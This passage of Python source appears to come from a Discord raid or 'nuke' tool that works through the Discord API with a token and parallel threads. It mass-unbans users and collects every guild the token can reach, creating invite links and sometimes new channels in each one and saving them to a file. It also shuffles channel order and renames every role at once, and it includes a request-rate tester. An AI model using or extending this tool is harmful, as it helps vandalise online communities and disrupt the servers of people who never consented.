                    futures = [executor.submit(unban, ban['user']['id']) for ban in bans]
                    for future in as_completed(futures):
                        try:
                            future.result()
                        except Exception as e:
                            logger.err(f"Error unbanning user", error=str(e))
            elif resp.status_code == 403:
                logger.wrn("Missing permissions to fetch bans")
            else:
                logger.err(f"Failed to fetch bans", response=resp.text, code=resp.status_code)
        except requests.exceptions.RequestException as e:
            logger.err(f"Request error occurred: {e}")
        except Exception as e:
            logger.err(f"An error occurred: {e}")






    def ScrapeGuilds(self):
        url = "https://discord.com/api/v10/users/@me/guilds"

        def GetInviteLink(self, id):
            try:
                chans = self.session.get(f"https://discord.com/api/v10/guilds/{id}/channels", headers=self.headers)
                chans.raise_for_status()
                chdata = chans.json()
                if chdata:
                    chanid = random.choice(chdata)['id']
                    logger.inf(f"Using channel {chanid} to create invite.")
                else:
                    logger.inf("No channels found, creating a new channel.")
                    newchan = {
                        "name": "idk",
                        "type": 0
                    }
                    newchans = self.session.post(f"https://discord.com/api/v10/guilds/{id}/channels", headers=self.headers, json=newchan)
                    newchans.raise_for_status()
                    chanid = newchans.json()['id']
                    logger.inf(f"Created new channel {chanid} for invite.")
                invdata = {"max_age": 86400, "max_uses": 0}
                invresp = self.session.post(f"https://discord.com/api/v10/channels/{chanid}/invites", headers=self.headers, json=invdata)
                invresp.raise_for_status()
                invcode = invresp.json()['code']
                invlink = f"https://discord.gg/{invcode}"
                logger.inf(f"Invite link created: {invlink}")
                return invlink

            except requests.exceptions.RequestException as e:
                logger.err(f"Request error occurred: {e}")
            except Exception as e:
                logger.err(f"An error occurred: {e}")
        try:
            resp = self.session.get(url, headers=self.headers)
            if resp == None:
                return None
            resp.raise_for_status()
            guilds = resp.json()
            logger.inf(f"Processing {len(guilds)} guilds")
            guild_info = {}
            for g in guilds:
                g_id = g['id']
                g_name = g['name']

                invite_url = GetInviteLink(self, g['id'])



                guild_info[g_name] = {
                    "id": g_id,
                    "invite": invite_url
                }

            os.makedirs('scrapes', exist_ok=True)
            with open('scrapes/guilds.json', 'w') as f:
                json.dump(guild_info, f, indent=4)

            os.system('notepad scrapes/guilds.json')
            logger.inf("Guild information scraped and saved successfully.")

        except requests.exceptions.RequestException as e:
            logger.err(f"Request error occurred: {e}")
        except Exception as e:
            logger.err(f"An error occurred: {e}")


    def ChangeGuild(self, new):
        self.guild = new

    def ShuffleChannels(self):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/channels"
        response = self.session.get(url, headers=self.headers)
        if response == None:
            return None
        if response.status_code in [200, 204]:
            channels = response.json()
            random.shuffle(channels)

            payload = [{"id": channel["id"], "position": index} for index, channel in enumerate(channels)]

            response = self.session.patch(url, json=payload, headers=self.headers)
            if response == None:
                return None
            if response.status_code in [200, 204]:
                logger.inf("Channels shuffled successfully")
            else:
                logger.err(f"Failed to shuffle channels", response=response.text, code=response.status_code)
        else:
            logger.err(f"Failed to get channels", response=response.text, code=response.status_code)


    def RenameAllRoles(self, new_name):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/roles"
        response = self.session.get(url, headers=self.headers)
        if response == None:
            return None
        if response.status_code in [200, 204]:
            roles = response.json()
            roles = [role for role in roles if role['name'] != '@everyone']

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self.RenameRole, role['id'], new_name): role['id'] for role in roles}

                for future in as_completed(futures):
                    rid = futures[future]
                    try:
                        future.result()
                    except Exception as e:
                        logger.err(f"Error renaming role", id=str(rid), error=str(e))
        else:
            logger.err(f"Failed to get roles", response=response.text, code=response.status_code)

    def RenameRole(self, rid, new_name):
        url = f"https://discord.com/api/v10/guilds/{self.guild}/roles/{rid}"
        payload = {
        "name": new_name
        }

        response = self.session.patch(url, json=payload, headers=self.headers)
        if response == None:
            return None
        if response.status_code in [200, 204]:
            logger.inf(f"Role {rid} renamed successfully")
        elif response.status_code == 429:
            logger.wrn(f"Rate limit response while renaming role {rid}")
        elif response.status_code == 403:
            logger.err(f"Bot does not have permissions to rename role {rid}")
        else:
            logger.err(f"Failed to rename role {rid}", response=response.text, code=response.status_code)


    def RPSCheck(self, url="https://httpbin.org/get", duration=10):
        rps = []

        def request():
            if self.session.terminated:
                return False
            try:
                self.session.get(url)
                logger.dbg("Finished a req")
            except Exception as e:
                logger.err(f"Request failed: {e}")
                return False
            return True

        start = time.time()
        end = start + duration

        while time.time() < end:
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = [ex.submit(request) for _ in range(250)]
                completed = sum(1 for fut in as_completed(futures) if fut.result())

            elapsed = time.time() - start
            if elapsed > 0:
                rps.append(completed / elapsed)

        if rps:
            high = max(rps)
            low = min(rps)
            avg = sum(rps) / len(rps)
        else:
            high = low = avg = 0

        logger.inf(f"Highest RPS: {high:.2f}")
        logger.inf(f"Lowest RPS: {low:.2f}")
        logger.inf(f"Average RPS: {avg:.2f}")
